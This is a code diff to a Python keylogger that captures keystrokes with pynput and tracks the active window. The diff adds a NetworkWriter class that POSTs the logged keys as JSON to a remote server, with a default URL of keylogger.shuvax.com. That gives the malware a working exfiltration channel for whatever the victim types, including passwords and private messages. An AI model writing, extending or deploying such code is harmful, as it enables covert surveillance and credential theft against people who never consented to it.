@@ -1,7 +1,7 @@
 from abc import ABC, abstractmethod
 from pynput.keyboard import Listener
 from typing import List
-import time,json,random,string,ToolBox,threading,pywinctl
+import time,json,random,string,ToolBox,threading,pywinctl,requests
 
 
 class IKeyLogger(ABC):
@@ -51,7 +51,10 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        return self.__logged_keys
+        if len(self.__logged_keys)<1:
+            return {}
+        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+
 
     def clear_logged_keys(self) -> dict[str:str]:
         self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
@@ -69,6 +72,16 @@ class FileWriter(Write):
                 file.write(convert_data)
                 return True
         except IOError:
+            return False
+
+class NetworkWriter(Write):
+    def __init__(self,url=None):
+        self.url = url or "https://keylogger.shuvax.com"
+    def write(self,data:dict[str:str]) -> bool:
+        try:
+            response = requests.post(self.url, json=data)
+            return response.status_code == 200
+        except requests.exceptions.RequestException:
             return False
 
 
@@ -113,9 +126,8 @@ class KeyLoggerManager:
 x = KeyLoggerManager()
 x.start_logging()
 while True:
-    time.sleep(8)
+    # time.sleep(1)
     x.print_keys()
-
 
 
 
